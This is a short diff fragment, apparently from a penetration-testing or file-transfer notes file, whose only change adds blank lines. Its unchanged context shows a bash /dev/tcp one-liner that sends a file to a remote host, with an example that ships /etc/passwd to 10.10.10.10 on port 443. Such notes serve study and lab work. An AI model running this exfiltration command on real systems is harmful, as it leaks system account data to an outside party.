@@ -20,3 +20,5 @@ cat > /dev/tcp/$TARGET_IP/$TARGET_PORT < $FILENAME
 ```
 cat > /dev/tcp/10.10.10.10/443 < /etc/passwd
 ```
+
+
